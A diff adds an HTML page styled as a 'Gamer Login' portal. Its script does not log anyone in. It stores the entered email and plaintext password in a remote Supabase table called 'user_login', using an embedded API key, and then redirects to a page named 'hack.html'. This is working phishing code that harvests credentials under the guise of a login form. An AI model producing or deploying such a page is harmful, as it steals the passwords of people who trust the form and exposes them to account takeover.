@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Game Login Portal</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #141e30, #243b55);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    .login-container {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 50px 40px;
+      border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 0 40px rgba(0, 255, 255, 0.2);
+      backdrop-filter: blur(10px);
+      transition: all 0.5s ease;
+      animation: fadeIn 1.5s ease;
+    }
+
+    .login-container:hover {
+      box-shadow: 0 0 60px rgba(0, 255, 255, 0.4);
+      transform: scale(1.02);
+    }
+
+    h1 {
+      margin-bottom: 30px;
+      font-weight: 600;
+      color: #00c6ff;
+      text-shadow: 0 0 20px rgba(0, 198, 255, 0.8);
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      margin: 15px 0;
+      border: none;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.1);
+      color: white;
+      font-size: 16px;
+      transition: background 0.5s;
+    }
+
+    input:focus {
+      background: rgba(255, 255, 255, 0.2);
+      outline: none;
+    }
+
+    button {
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      color: white;
+      padding: 15px;
+      width: 100%;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 16px;
+      margin-top: 20px;
+      box-shadow: 0 0 20px rgba(0, 114, 255, 0.5);
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      box-shadow: 0 0 40px rgba(0, 114, 255, 0.8);
+      transform: scale(1.05);
+    }
+
+    #status {
+      margin-top: 20px;
+      color: #ff4e4e;
+      font-weight: bold;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>Gamer Login 🚀</h1>
+    <input type="email" id="email" placeholder="Enter Email">
+    <input type="password" id="password" placeholder="Enter Password">
+    <button onclick="insertIntoTable()">Login</button>
+    <p id="status"></p>
+    <p style="color: aliceblue;">POWERED BY NAT TECH</p>
+  </div>
+  <script src="https://unpkg.com/@supabase/supabase-js"></script>
+<script>
+  // ✅ CORRECT INITIALIZATION
+  const { createClient } = supabase;
+  const supabaseClient = createClient("https://qprmenpbktfmlgrvmnms.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFwcm1lbnBia3RmbWxncnZtbm1zIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY5MDE3NTYsImV4cCI6MjA2MjQ3Nzc1Nn0.CA69E_h-tjA-cDp165Qa5ONc_PfTIzLqMDhaqQqEo7M");
+
+  async function insertIntoTable() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if (!email || !password) {
+      document.getElementById('status').innerText = '❌ Please enter both email and password.';
+      return;
+    }
+
+    // ✅ Use the correct client variable
+    const { data, error } = await supabaseClient
+      .from('user_login')
+      .insert([{ username: email, password  : password }]);
+
+    if (error) {
+      console.error('Supabase Error:', error);
+      document.getElementById('status').innerText = '❌ ' + error.message;
+    } else {
+        document.getElementById('status').style.color = '#00ff99';
+    document.getElementById('status').innerText = '✅ Data inserted into table! Redirecting...';
+    
+    // ✅ REDIRECT after a small delay for user feedback
+    setTimeout(() => {
+      window.location.href = 'hack.html';
+    }, 1000); // 1 second delay
+  }
+}
+</script>
+
+</body>
+</html>
